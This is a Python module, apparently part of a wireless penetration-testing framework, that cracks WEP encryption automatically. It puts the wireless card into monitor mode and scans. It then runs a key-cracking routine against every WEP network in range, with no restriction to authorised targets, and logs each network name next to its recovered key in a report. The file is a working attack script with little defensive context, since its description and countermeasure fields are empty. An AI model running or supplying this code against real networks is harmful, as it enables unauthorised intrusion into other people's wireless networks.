#!/usr/bin/env python3
from os.path import splitext, basename

from tests.test import Test
from tools.aircrack import Aircrack
from tools.airmon import Airmon

title = 'WEP crack'
desc = ''
vulnerability = ''
exploit = ''
countermeasure = ''


class Wep(Test):
    def __init__(self):
        Test.__init__(self)
        self.title = title
        self.desc = desc
        self.vulnerability = vulnerability
        self.exploit = exploit
        self.countermeasure = countermeasure
        self.filename = splitext(basename(__file__))[0] + ".md"
        self.airmon = Airmon()
        self.aircrack = Aircrack()
        self.run()

    def run(self):
        # Monitor mode
        self.airmon.monitor()

        # Scan
        self.aircrack.scan()
        #self.results += self.aircrack.raw_csv

        # Extracting
        if not Aircrack.targets_wep:
            self.results += "\nNo WEP networks!"
            self.code = 1
        else:
            for t in Aircrack.targets_wep:
                count = 1
                print("Attempt " + str(count))
                self.code = self.aircrack.auto_crack_wep(t)
                while self.code is not 0 and count is not 5:
                    self.code = self.aircrack.auto_crack_wep(t)
                    count+=1
                # Logging
                self.results += t.essid + " = "
                self.results += t.key + '\n'

        # Station/managed mode
        self.airmon.station()

        self.build_report()
        self.end()
